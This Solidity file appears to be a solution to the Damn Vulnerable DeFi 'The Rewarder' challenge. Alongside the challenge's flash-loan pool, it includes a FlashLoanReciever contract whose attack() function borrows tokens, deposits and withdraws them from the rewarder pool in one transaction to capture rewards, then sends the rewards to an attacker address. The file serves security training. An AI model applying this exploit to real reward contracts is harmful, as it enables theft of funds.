// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 * @dev A simple pool to get flash loans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable liquidityToken;

    constructor(address liquidityTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
        require(amount <= balanceBefore, "Not enough token balance");
        require(
            msg.sender.isContract(),
            "Borrower must be a deployed contract"
        );

        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(
            abi.encodeWithSignature("receiveFlashLoan(uint256)", amount)
        );

        require(
            liquidityToken.balanceOf(address(this)) >= balanceBefore,
            "Flash loan not paid back"
        );
    }
}

contract FlashLoanReciever {
    FlashLoanerPool myFlashLoanerPool;
    TheRewarderPool myRewarderPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken myRewardToken;

    address loaner;
    address pool;

    constructor(
        address liquidityTokenAddress,
        address _loaner,
        address _pool,
        address _rewardToken
    ) {
        loaner = _loaner;
        pool = _pool;
        myRewarderPool = TheRewarderPool(pool);
        myFlashLoanerPool = FlashLoanerPool(loaner);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        myRewardToken = RewardToken(_rewardToken);
    }

    function attack(uint256 _amount, address _attacker) public {
        myFlashLoanerPool.flashLoan(_amount);
        uint256 rewardsEarned = myRewardToken.balanceOf(address(this));
        myRewardToken.transfer(_attacker, rewardsEarned);
    }

    function receiveFlashLoan(uint256 _amount) public virtual {
        liquidityToken.approve(pool, _amount);
        myRewarderPool.deposit(_amount);
        myRewarderPool.withdraw(_amount);
        liquidityToken.transfer(loaner, _amount);
    }
}
